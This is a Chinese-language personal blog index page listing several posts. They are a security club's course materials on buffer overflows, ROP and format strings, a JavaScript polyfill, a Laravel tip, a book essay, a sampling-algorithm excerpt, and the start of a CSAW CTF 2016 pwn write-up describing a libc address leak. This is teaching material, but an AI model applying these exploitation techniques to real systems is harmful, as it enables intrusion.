<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/46/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/46/"/>





  <title>逐流小站</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-MW47YH6RH0', 'auto');
  ga('send', 'pageview');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/27/106-club-course/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/27/106-club-course/" itemprop="url">106 club course</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-27T02:14:00+08:00">
                2016-09-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tutorial/" itemprop="url" rel="index">
                    <span itemprop="name">tutorial</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="106上學期社課"><a href="#106上學期社課" class="headerlink" title="106上學期社課"></a>106上學期社課</h1><h2 id="9-30-第一堂社課"><a href="#9-30-第一堂社課" class="headerlink" title="9&#x2F;30 第一堂社課"></a>9&#x2F;30 第一堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2dY3bAMpyESRy1nVUsyZ0lvQzQ/view?usp=sharing">Linux_and_SA</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/python">Python</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="http://cdimage.kali.org/kali-2016.2/kali-linux-2016.2-amd64.iso">Kali iso</a></p>
<p><a target="_blank" rel="noopener" href="http://releases.ubuntu.com/16.04.1/ubuntu-16.04.1-desktop-amd64.iso">Ubuntu iso</a></p>
<h2 id="10-14-第二堂社課"><a href="#10-14-第二堂社課" class="headerlink" title="10&#x2F;14 第二堂社課"></a>10&#x2F;14 第二堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOcDNHcl9oTksxZTg/view">Web Security</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wq9X2qIV-Xg">課程錄影</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HvhgTF_Upqk">課程錄影</a></li>
</ul>
<h2 id="10-28-第三堂社課"><a href="#10-28-第三堂社課" class="headerlink" title="10&#x2F;28 第三堂社課"></a>10&#x2F;28 第三堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/some-tips">Some tips</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/x86">x86</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=32PvtalAC2A">課程錄影</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/gdb">gdb</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=50acU6jrpkg">課程錄影</a></li>
</ul>
<h2 id="11-18-第四堂社課"><a href="#11-18-第四堂社課" class="headerlink" title="11&#x2F;18 第四堂社課"></a>11&#x2F;18 第四堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/naetw/buffer-overflow">Buffer overflow</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~chaoyy1202/Demo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oPAh0fy3eAo">課程錄影</a></li>
</ul>
<h2 id="12-09-第五堂社課"><a href="#12-09-第五堂社課" class="headerlink" title="12&#x2F;09 第五堂社課"></a>12&#x2F;09 第五堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B7_xqQeTuoLpejJ0SFQ5b3dMbWs/view">ROP</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/ROPDemo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://youtu.be/QYmWq2o7MtA">課程錄影</a></li>
</ul>
<hr>
<h1 id="106-下學期社課"><a href="#106-下學期社課" class="headerlink" title="106 下學期社課"></a>106 下學期社課</h1><h2 id="03-03-第一堂社課"><a href="#03-03-第一堂社課" class="headerlink" title="03&#x2F;03 第一堂社課"></a>03&#x2F;03 第一堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B76OxXT0skp6NnZDbVB4UGYycUk/view">Format String</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/FMTdemo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://youtu.be/FvGhDlK36PI">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/oiicCDA4RNc">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/o3KXSayMvhw">part3</a></li>
</ul>
<h2 id="03-17-第二堂社課"><a href="#03-17-第二堂社課" class="headerlink" title="03&#x2F;17 第二堂社課"></a>03&#x2F;17 第二堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/12">題目1</a></li>
<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/13">題目2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=VXbYyYYcvdU">課程錄影</a></li>
</ul>
<h2 id="04-18-第三堂社課"><a href="#04-18-第三堂社課" class="headerlink" title="04&#x2F;18 第三堂社課"></a>04&#x2F;18 第三堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOUjRSdDRZUEdBbU0/view?usp=sharing">Crypto 講義</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOc0Q2YTdad3lTMms/view?usp=sharing">題目與工具</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kURuAjqFv9k">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qyjaqF6p4hw">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=dkinSlwM5u8">part3</a></li>
</ul>
<h2 id="04-28-第四堂社課"><a href="#04-28-第四堂社課" class="headerlink" title="04&#x2F;28 第四堂社課"></a>04&#x2F;28 第四堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOZ04xekRnZDRUZmc/view">Length Extension Attack</a></li>
</ul>
<h2 id="05-05-第五堂社課"><a href="#05-05-第五堂社課" class="headerlink" title="05&#x2F;05 第五堂社課"></a>05&#x2F;05 第五堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://hackmd.io/p/BkKNiQzee#/">Web Security Basic</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=jENhKE2yTOU&feature=youtu.be">課程錄影</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/26/2016/browser-compatibility-of-string-prototype-endswith/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/26/2016/browser-compatibility-of-string-prototype-endswith/" itemprop="url">String.prototype.endsWith() 的浏览器兼容性问题</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-26T22:28:29+08:00">
                2016-09-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><code>String.prototype.endsWith()</code> 这个方法是 ECMA6 新加入的，而我当初随手 Google 了一下，也没怎么看就直接用上去了，直到我今天在一台破手机上测试的时候发现有个用到这个方法的值神秘地变成了 <code>undefined</code> ( ´_ゝ&#96;)</p>
<p>我记得上次好像也是这样随手搜索导致使用了不兼容的函数 ( -д-) <del>论面向搜索引擎编程的坏处</del></p>
<p>不过我们还是可以通过扩展 <code>String</code> 的原型来实现在不支持的浏览器上使用这个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 代码来自 MDN</span><br><span class="line"> *</span><br><span class="line"> * @link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if (!String.prototype.endsWith) &#123;</span><br><span class="line">  String.prototype.endsWith = function(searchString, position) &#123;</span><br><span class="line">      var subjectString = this.toString();</span><br><span class="line">      if (typeof position !== &#x27;number&#x27; || !isFinite(position) || Math.floor(position) !== position || position &gt; subjectString.length) &#123;</span><br><span class="line">        position = subjectString.length;</span><br><span class="line">      &#125;</span><br><span class="line">      position -= searchString.length;</span><br><span class="line">      var lastIndex = subjectString.lastIndexOf(searchString, position);</span><br><span class="line">      return lastIndex !== -1 &amp;&amp; lastIndex === position;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/" itemprop="url">使用 Laravel 的 RedirectResponse 重定向至任意 URL</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T23:32:18+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>Laravel 允许我们在控制器中返回一个 <code>Illuminate\Http\RedirectResponse</code> 的实例来执行重定向。根据文档，我们可以通过 <code>redirect()</code> 帮助函数或者 <code>Redirect</code> Facade 来生成实例，并且可以方便得重定向至命名路由、控制器行为等。</p>
<blockquote>
<p>但如果我们想要重定向至自定义 URL 呢？</p>
</blockquote>
<p>对于这样的需求，Laravel 官方的文档是<strong>完全</strong>没有提及的（至少到目前 5.3 是这样），所以估计很多人都是自己实现了一个使用 <code>header()</code> 或者 <code>&lt;meta http-equiv=&#39;Refresh&#39; content=&#39;&#39;&gt;</code> 的重定向函数（包括以前的我）。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/" itemprop="url">你了解爱的艺术吗？</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T22:42:44+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">读书笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          我们常常表现出，一种试图要要证明比别人过得更好的心态，仿佛在朋友圈或者微博这种社交平台上，我们能找到更多的自豪感，可我同样知道，这个世界上最大的社交网站 Facebook，背后却是由一个有社交障碍的人创造出来的，我们都渴望让别人了解自己、认识自己，这不同于社交场合里那种客套的场面话，对此，弗洛姆认为，人与人之间可以通过讲述这种方式来打破人与生俱来的这种孤独感，“讲述自己的生活，叙述自己的希望和恐惧，谈出自己幼稚的或者不成熟的梦想，以及找到面对世界的共同利益——所有这一切都是克服人与人之间隔离的途径，甚至表露自己的愤怒和仇恨，毫无顾忌地交心也都被看作是亲密的表现”，我们对爱的终极理解其实应该是，我们通过爱一个人，进而爱全人类，爱一切生命，我们从自我的生命的本质出发去爱对方，并且去体验对方的本质，爱情是意志的行为，是人作的一项把全部生命交付对方的决定;爱的确是一门艺术，可对我们每个人而言，它像是某种缥缈甚至是难以揣测的情绪，你不能用一种非常理性的眼光来审视和定义它的存在，弗洛姆说：“不是拥有财物的人是富裕的，而是给予他人东西的人才是富裕者”，可现实是并非你不顾一切地对一个人好，就能赢得一份让你感动的爱情，所以在经历过挫折以后，我不再考虑一味地索取或者付出，我喜欢将这个过程叫做分享，人们在分享的过程中认识彼此、丰富彼此、提高彼此的生命感，这是我认为在爱情中我们需要去挖掘的一种潜质，如果一个人没有生命力，就不会有创造爱情的能力，所以当我们试图爱一个人之前，我们首先要学会爱我们自己，而弗洛伊德将这种人的自我欣赏叫做“自恋”，除了爱情自身积极性的因素以外，爱情具有所有爱的形式所共有的因素，如：关心、责任心、尊重和理解;我们来到这个世界上，更本质的意义在于我们希望认识些有趣的人，做些有趣的事情而已，这意味着我们常常试图在这个世界上留下自己的印记，我们习惯了在朋友圈里晒美食、晒旅游、晒自拍等等约定俗成的处事方法，亦如我们生来就渴望被人理解、被人喜欢一样，而这一切更本质的原因，我们现在称为“刷存在感”，恰恰迎合了这个观点，我们想要在这个世界上留下我们的印记，即使这些方式方法看起来并不是我们最初喜欢的样子，弗洛姆将在这个观点理解为“超越自己”的追求，这一追求属于人的最基本要求，即“人对自己的纯生物作用不满，他不能忍受自己仅仅是被扔进这一世界的小卒
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/" itemprop="url">一个关于概率的问题的思考</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T20:06:45+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">编程语言</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          在这里 Contract 实现了 IRankable 接口，每个 Contract 的权重由 Level 和 Priority 两个属性来计算，示例中我们一次从集合中随机抽取了 10 个 Contract，而我们的算法能够保证它们都是不重复的，这个程序可以满足各种各样的抽取规则，比如按照 Contract 的口语、职位等不同的维度进行概率模型的建立即可，只要它实现了 IRankable 接口就可以使用这篇文章中的方法来随机抽取，这其实是一个业余时间的小项目啦，可我还是想让自己认真地考虑下这个问题，所以我花时间写了这篇文章，我对它的期望并没有太高，我喜欢将这些想法写下来而已;后者在每次抽取完以后需要将抽中的奖品从奖品池中取出，重新计算概率后方能进行下一轮抽取，所以这里我们直接给出这两两种抽取方法的代码实现，这里需要考虑的一个问题是，在抽取指定数目个“奖品”的时候我们通常不希望出现重复的元素，前者需要我们判断已抽取的奖品列表中是否存在指定元素，而后者因为抽取的奖品会被取出，所以不需要考虑这种情况的处理;好了，现在我们就获得了不同权重物品所对应的累积概率，即其概率范围，因此我们可以利用随机生成[0,1)范围内的随机数，然后判断随机数所在哪个概率范围内，我们就可以知道要对哪个权重分组中的奖品进行抽取，而对每个权重分组来说，因为其权重都是一样的，所以这里抽取试验可以认为是符合随机概率的，我们只需要从该分组中随机选取一个奖品返回就可以啦
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/20/CSAW-CTF-2016-tutorial-200/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/20/CSAW-CTF-2016-tutorial-200/" itemprop="url">[CSAW CTF 2016] tutorial 200</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-20T22:42:00+08:00">
                2016-09-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="CSAW-CTF-2016-tutorial-200"><a href="#CSAW-CTF-2016-tutorial-200" class="headerlink" title="[CSAW CTF 2016] tutorial 200"></a>[CSAW CTF 2016] tutorial 200</h1><blockquote>
<p>Category: pwn<br>Point: 200<br>Solver: briansp8210 @ BambooFox	</p>
</blockquote>
<h1 id="tutorial"><a href="#tutorial" class="headerlink" title="tutorial"></a>tutorial</h1><p>由於自己對於網路程式設計還沒有概念，而且執行檔在 local 跑不起來，不能用 gdb 觀察，所以看得蠻吃力的。後來感謝 bruce 學長的提點，才順利解出來XD</p>
<h2 id="解題流程"><a href="#解題流程" class="headerlink" title="解題流程"></a>解題流程</h2><p>程式一開始會建立 socket 連線，然後執行 <code>fork</code> 後進入 <code>menu(int socket)</code> 選單。</p>
<ul>
<li>選項 1 會輸出 <code>puts()</code> 的 address 扣掉 1280 的值，可以從這邊推出 libc address。</li>
